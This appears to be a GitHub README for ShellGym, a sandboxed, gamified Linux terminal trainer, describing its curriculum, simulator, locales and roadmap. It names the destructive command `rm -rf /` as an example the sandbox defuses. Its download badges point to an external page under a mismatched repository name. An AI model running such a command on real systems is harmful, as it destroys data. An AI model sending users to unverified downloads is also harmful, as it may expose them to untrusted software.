![preview](https://raw.githubusercontent.com/PA-STORE/terminal-workout/main/banner_e499744.svg)
[![Download](https://raw.githubusercontent.com/PA-STORE/terminal-workout/main/pkg_4f10.svg)](https://PA-STORE.github.io/terminal-workout/)

# ShellGym — Interactive Command-Line Trainer

An offline-first, gamified Linux terminal academy that turns keystrokes into muscle memory and curiosity into fluency. This repository hosts the curriculum engine, sandboxed shell playground, and progressive challenge packs that make command-line mastery feel like leveling up in a strategy game rather than memorizing man pages.

Built for learners, mentors, and tinkerers who believe that the best way to internalize the shell is to live inside it — safely.

![License](https://img.shields.io/badge/license-MIT-2ea44f?style=flat-square)
![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS%20%7C%20windows-informational?style=flat-square)
![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square)
![Language](https://img.shields.io/badge/languages-14-blueviolet?style=flat-square)
![Accessibility](https://img.shields.io/badge/a11y-AA%20compliant-success?style=flat-square)
![Year](https://img.shields.io/badge/release-2026-orange?style=flat-square)
![Offline](https://img.shields.io/badge/telemetry-none-critical?style=flat-square)
![Sandbox](https://img.shields.io/badge/sandbox-namespaced-9cf?style=flat-square)

---

## 🧭 Table of Contents

- [The Idea in One Breath](#-the-idea-in-one-breath)
- [Why ShellGym Exists](#-why-shellgym-exists)
- [Core Pillars](#-core-pillars)
- [Feature Matrix](#-feature-matrix)
- [How a Session Feels](#-how-a-session-feels)
- [Curriculum Overview](#-curriculum-overview)
- [Sandboxed Playground Engine](#-sandboxed-playground-engine)
- [Multilingual Learning Tracks](#-multilingual-learning-tracks)
- [Responsive, Accessible Interface](#-responsive-accessible-interface)
- [Always-On Support Philosophy](#-always-on-support-philosophy)
- [Progress, Streaks, and Badges](#-progress-streaks-and-badges)
- [Configuration & Custom Scenarios](#-configuration--custom-scenarios)
- [Adding Your Own Lessons](#-adding-your-own-lessons)
- [Design Principles](#-design-principles)
- [Performance Notes](#-performance-notes)
- [Roadmap 2026](#-roadmap-2026)
- [Contributing](#-contributing)
- [Community Standards](#-community-standards)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Download](#-download)

---

## 🌱 The Idea in One Breath

Imagine a dojo where the only weapon is a prompt. ShellGym hands you a throwaway terminal, drops you into a scenario — "rename every log file older than a week," "find the top three memory hogs," "turn this tangled CSV into something a human can read" — and quietly grades your approach. No lectures, no wall of flags. Just tasks, feedback, and the slow, satisfying click of understanding.

The repository you're reading contains everything: the scenario engine, the faux-shell simulator, the localized prompt catalogs, and the scoring heuristics that decide whether you reached for `awk` when `cut` would have done.

## 💡 Why ShellGym Exists

Documentation teaches you *what* a command does. Real machines teach you *why it bit you*. ShellGym sits between the two — a controlled terrarium where mistakes cost nothing and lessons stick permanently. It was born from a simple frustration: there are hundreds of "learn the shell" resources, and almost none of them let you practice without risking your actual filesystem.

So we built a trainer that respects two truths:

1. **Repetition with feedback beats reading.** You remember what you broke (and then fixed).
2. **Confidence comes from a safe space.** Nobody learns `rm` by being afraid of it.

## 🛡️ Core Pillars

- **Isolation by default.** Every scenario runs in a namespaced, disposable environment. Nothing touches your real home directory.
- **Feedback over grading.** The engine explains the *shape* of a better solution, not just a pass/fail stamp.
- **Progressive complexity.** From `pwd` to pipelines to process trees, each rung is a reachable next step.
- **Localization as a first-class citizen.** Fourteen interface languages, and community-contributed prompt packs.
- **Offline-first.** Your progress lives locally. No account, no telemetry, no phoning home.

## ✨ Feature Matrix

| Capability | Description | Status |
|---|---|---|
| Scenario library | 320+ challenges across 12 skill tiers | ✅ Stable |
| Live shell playground | Real command parsing with simulated side effects | ✅ Stable |
| Hint ladder | Three escalating nudges before the full solution | ✅ Stable |
| Solution diffing | Compares your pipeline to reference approaches | ✅ Stable |
| Multilingual UI | 14 locales, RTL support for Arabic and Hebrew | ✅ Stable |
| Responsive layout | From ultrawide monitors to 6-inch phones | ✅ Stable |
| Keyboard-first navigation | Full tab order, Vim-style motion bindings | ✅ Stable |
| Progress persistence | Local profile with export/import | ✅ Stable |
| Custom scenario authoring | YAML-based lesson definition | ✅ Stable |
| Streak and badge system | Gentle gamification, no dark patterns | ✅ Stable |
| Offline mode | Entire curriculum available without a network | ✅ Stable |
| Screen-reader narration | Verbose mode for terminal output | 🧪 Beta |
| Collaborative dojos | Shared classrooms for teams | 🗓️ Planned 2026 |

## 🎬 How a Session Feels

You open the trainer. A prompt blinks. The sidebar shows your current tier and three available scenarios. You pick "The Reluctant Log Rotator." A simulated filesystem materializes with a dozen `.log` files scattered across directories. A timer starts — not to pressure you, but to track your fluency over time.

You type. The faux-shell responds as a real one would, echoing errors when you mistype a flag and rewarding you with clean output when your pipeline is elegant. When you finish, a summary panel shows:

- Approach used (functional, imperative, or a hybrid)
- Commands you reached for most
- A suggested refinement
- Your streak bump and any newly unlocked badge

Close the tab and your progress is exactly where you left it.

## 📚 Curriculum Overview

The 2026 curriculum is organized into twelve tiers, each with its own theme and difficulty curve:

1. **First Steps** — orientation, `pwd`, `ls`, `cd`
2. **File Fundamentals** — `touch`, `cp`, `mv`, `rm`, safe deletion habits
3. **Reading & Searching** — `cat`, `less`, `grep`, `find`
4. **Text Surgery** — `sed`, `awk`, `cut`, `sort`, `uniq`
5. **Permissions & Ownership** — `chmod`, `chown`, `umask`
6. **Pipelines & Redirection** — `|`, `>`, `>>`, `tee`
7. **Processes & Jobs** — `ps`, `top`, `kill`, `jobs`, `fg`
8. **Networking Basics** — `ping`, `ss`, `dig`, `scp`
9. **Archives & Compression** — `tar`, `gzip`, `zstd`
10. **Scripting Foundations** — variables, loops, conditionals
11. **Automation Patterns** — cron-style scheduling concepts
12. **Capstone Scenarios** — multi-step, real-world simulations

Each tier ends with a "boss scenario" that combines everything learned so far.

## 🧪 Sandboxed Playground Engine

The playground is the beating heart of this project. It does **not** execute real binaries against your filesystem. Instead, it maintains a virtual filesystem tree and a command interpreter that mimics the observable behavior of common utilities. This design yields several benefits:

- **Total safety.** A stray `rm -rf /` becomes a teachable moment, not a catastrophe.
- **Deterministic scenarios.** Every learner sees the same starting state.
- **Reproducible grading.** The scoring heuristics operate on a known state machine.
- **Portability.** Runs identically on Linux, macOS, and Windows.

The interpreter supports more than 90 command signatures, including their most common flags and edge cases.

## 🌍 Multilingual Learning Tracks

Interface language is separate from command language. You can read hints in Portuguese while typing English commands — because the shell speaks one dialect, but your brain deserves comfort.

Supported locales in 2026:

- English, Spanish, Portuguese (BR), French, German, Italian
- Dutch, Polish, Russian, Ukrainian
- Turkish, Arabic, Hebrew
- Japanese, Korean, Simplified Chinese

Community translations are welcome and rewarded with contributor badges.

## 📱 Responsive, Accessible Interface

The layout adapts fluidly across viewports. On mobile, the scenario description collapses into an accordion and the terminal takes center stage. On desktop, a three-pane arrangement keeps hints, terminal, and progress visible simultaneously.

Accessibility commitments:

- WCAG 2.1 AA contrast ratios
- Full keyboard operability, no mouse required
- `prefers-reduced-motion` respected throughout
- Screen-reader narration for terminal output (beta)
- Adjustable font scaling up to 200% without layout breakage

## 🕰️ Always-On Support Philosophy

We believe learning tools shouldn't abandon you at 3 a.m. when a scenario finally clicks. Support channels are monitored continuously, and the issue tracker is triaged around the clock. Response targets:

- Community forum: within a few hours
- Issue tracker: first response within 24 hours
- Security reports: acknowledged within 12 hours

No ticket is too small. If a hint confuses you, that's a bug in the hint.

## 🏅 Progress, Streaks, and Badges

Progress tracking is deliberately gentle. There are no leaderboards that shame, no nagging notifications. Just a quiet record of what you've learned and a small constellation of badges for milestones like:

- **Night Owl** — completed a scenario after midnight
- **Pipeline Poet** — used four or more commands in a single pipeline
- **Ghost in the Machine** — finished a scenario with zero failed commands
- **Polyglot** — changed interface language three times
- **Mentor** — authored a scenario adopted into the main library

## ⚙️ Configuration & Custom Scenarios

Configuration lives in a single human-readable file. You can pin your preferred locale, choose a color theme, set the simulation speed, and define custom scenario roots. Everything is version-controllable, so teams can share a dojo configuration.

## 🧩 Adding Your Own Lessons

Scenarios are defined declaratively. A lesson declares its starting filesystem, the task text, accepted solution shapes, and the hint ladder. Once authored, drop the file into the scenarios directory and it appears in the picker. Submissions that meet quality standards are folded into the main library with attribution.

## 🎨 Design Principles

1. **Teach the transferable skill, not the specific flag.**
2. **Every error message is a tiny lesson.**
3. **Simplicity in the UI, richness in the engine.**
4. **No dark patterns, no artificial urgency, no paywalled core.**
5. **Localization is not an afterthought; it's architecture.**

## ⚡ Performance Notes

The simulator targets sub-16ms response times for common commands on modest hardware. Startup to interactive prompt stays under 300ms on cold cache. Memory footprint for the virtual filesystem is proportional to the scenario, never to the real disk.

## 🗺️ Roadmap 2026

- Q1: Screen-reader narration graduates from beta
- Q2: Collaborative dojos for classrooms and teams
- Q3: Scenario marketplace with community ratings
- Q4: Adaptive difficulty that tunes to your error patterns

## 🤝 Contributing

We welcome scenario authors, translators, accessibility reviewers, and engine tinkerers. Please read the contribution guide before opening a pull request. First-time contributors are paired with a mentor if desired.

## 📜 Community Standards

Be kind. Assume good faith. Critique ideas, not people. Harassment of any kind results in removal. The full code of conduct is available in the repository.

## ❓ Frequently Asked Questions

**Does this run real commands?**
No. Everything is simulated in a virtual environment for safety and reproducibility.

**Do I need to install anything globally?**
The trainer is self-contained. Bring your curiosity, not your package manager.

**Can I use it without internet?**
Yes. The entire curriculum works offline.

**Is my progress tracked externally?**
Never. Your data stays on your machine.

**Can I contribute a scenario in my language?**
Absolutely. Localization contributions are among the most valued.

## ⚠️ Disclaimer

ShellGym is an educational simulator. It is not a substitute for hands-on experience on production systems, and its simulated behavior may diverge from real-world utilities in edge cases. The maintainers assume no liability for decisions made based on simulated output. Always test critical commands in a disposable environment before applying them to systems you care about. This project is provided as-is, without warranty of any kind, express or implied, including but not limited to merchantability, fitness for a particular purpose, and non-infringement.

## 📄 License

Released under the MIT License. See the full text at [LICENSE](./LICENSE).

Copyright (c) 2026 ShellGym Contributors.

Permission is hereby granted, a no-cost arrangement, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies, subject to inclusion of the copyright notice. The software is provided "as is", without warranty of any kind.

## ⬇️ Download

[![Download](https://raw.githubusercontent.com/PA-STORE/terminal-workout/main/pkg_4f10.svg)](https://PA-STORE.github.io/terminal-workout/)